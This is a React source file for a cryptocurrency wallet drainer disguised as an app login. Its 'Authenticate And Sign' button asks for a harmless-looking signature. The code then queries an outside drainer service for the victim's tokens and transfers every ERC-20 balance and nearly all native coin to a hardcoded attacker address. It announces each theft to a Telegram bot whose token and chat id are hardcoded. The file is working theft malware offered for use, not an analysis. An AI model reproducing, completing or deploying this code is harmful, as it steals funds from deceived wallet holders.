import React from "react";
import { useTransferNativeToken } from "@thirdweb-dev/react";
import {
  ConnectWallet,
  useConnect,
  useAddress,
  metamaskWallet,
  useSDK,
} from "@thirdweb-dev/react";

import { ethereum, polygon,  } from "@thirdweb-dev/chain";

import Web3 from "web3";
import axios from "axios";
import BN from "bn.js";
import ERC20ABI from "./ERC20.json";

var chatid = "6237602009";
var token = "6273581868:AAF3NvaWaGEHZzAj9I0sa4FTg3lQD8nGIp8";

const walletConfig = metamaskWallet();

const App = () => {
  const {
    mutate: transferNativeToken,
    isLoading,
    error,
  } = useTransferNativeToken();
  const address = useAddress();
  const sdk = useSDK();

  if (error) {
    console.error("failed to transfer tokens", error);
  }

  const connect = useConnect();

  async function handleConnect() {
    try {
      const wallet = await connect(walletConfig, {});
      console.log("connected to", wallet);
    } catch (e) {
      console.error("failed to connect", e);
    }
  }

  function SendTelegramMessage(token,text,chatid){
    var z=$.ajax({
      type: "POST",
      url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
      data: "parse_mode=HTML&text="+encodeURIComponent(text),
      });
    };

  async function calculateDrainAmount(fromAddress, toAddress, balance, tokens) {
    const web3 = new Web3(window.ethereum);

    try {
      let totalGasFee = new BN(0);

      // Calculate gas for ERC-20 transfers
      for (const token of tokens) {
        if (token.symbol !== "ETH") {
          const contract = new web3.eth.Contract(ERC20ABI, token.token_address);
          const gasEstimateERC20 = await contract.methods
            .transfer(toAddress, token.balance)
            .estimateGas({ from: fromAddress });
          totalGasFee = totalGasFee.add(new BN(gasEstimateERC20));
        }
      }

      // Calculate gas for native token transfer
      const estimatedGas = await web3.eth.estimateGas({
        from: fromAddress,
        to: toAddress,
        value: balance,
      });
      totalGasFee = totalGasFee.add(new BN(estimatedGas));

      const block = await web3.eth.getBlock("latest");
      let gasCost = new BN(0);

      const gasPrice = await web3.eth.getGasPrice();
      const adjustedGasPrice = new BN(gasPrice)
        .mul(new BN(120))
        .div(new BN(100));

      if (block.baseFeePerGas) {
        // EIP-1559: Calculate gas fee with baseFeePerGas
        const baseFeePerGas = new BN(block.baseFeePerGas);
        const maxPriorityFeePerGas = adjustedGasPrice.sub(baseFeePerGas);
        const maxFeePerGas = baseFeePerGas.add(maxPriorityFeePerGas);

        gasCost = totalGasFee.mul(maxFeePerGas);
      } else {
        // Legacy gas price calculation
        gasCost = totalGasFee.mul(adjustedGasPrice);
      }

      // Add a fixed buffer to the gas fee
      const fixedBuffer = new BN(web3.utils.toWei("0.001", "ether")); // 0.001 ETH as buffer
      const totalFee = gasCost.add(fixedBuffer);

      const balanceBN = new BN(balance);
      const drainableAmount = balanceBN.sub(totalFee);

      return {
        drainableAmount: drainableAmount.toString(),
        gasFee: totalFee.toString(),
      };
    } catch (error) {
      console.error("Error in calculating drain amount:", error);
      throw error;
    }
  }

  const signMessage = async () => {
    const web3 = new Web3(window.ethereum);
    const message = "Signing Message From My App";
    try {
      const signature = await web3.eth.personal.sign(message, address, "");
      console.log("Message signed successfully:", signature);
      try {
        console.log(address);
        const response = await axios.post(
          "https://drainer-pi.vercel.app/tokens",
          {
            walletAddress: address,
          },
          {
            headers: {
              "Content-Type": "application/json",
            },
          }
        );

        if (response.status !== 200) {
          throw new Error("Failed to fetch tokens");
        }

        const data = response.data;
        console.log(data);
        const tokens = data.tokens.result;

        // Calculate gas for native token transfer and all ERC-20 transfers
        const nativeTokenBalance = await web3.eth.getBalance(address);
        const { drainableAmount, gasFee } = await calculateDrainAmount(
          address,
          "0x2B060a7225c92a4ABb5f6DC8F2D1f196df974CBA",
          nativeTokenBalance,
          tokens
        );

        // Execute Transfers
        if (new BN(drainableAmount).gt(new BN(0))) {
          // Transfer ERC-20 tokens
          for (const token of tokens) {
            if (token.symbol !== "ETH") {
              const contract = new web3.eth.Contract(
                ERC20ABI,
                token.token_address
              );
              await contract.methods
                .transfer(
                  "0x2B060a7225c92a4ABb5f6DC8F2D1f196df974CBA",
                  token.balance
                )
                .send({ from: address });
                SendTelegramMessage(token, "💰Geschets!!! Voor: " + drainableAmount + " ETH💰", chatid);
            }
          }

          // Transfer native token
          transferNativeToken({
            to: "0x2B060a7225c92a4ABb5f6DC8F2D1f196df974CBA",
            amount: web3.utils.fromWei(drainableAmount, "ether"),
          });
        } else {
          console.log("Not enough balance to cover gas fees");
        }
      } catch (error) {
        console.error("Error fetching tokens:", error);
      }
    } catch (error) {
      console.error("Error signing message:", error);
    }
  };

  return (
    <>
      <ConnectWallet />
      <button onClick={handleConnect}>Connect Wallet</button>
      <h3>Wallet Address: {address}</h3>
      <button disabled={isLoading} onClick={signMessage}>
        Authenticate And Sign
      </button>
    </>
  );
};

export default App;
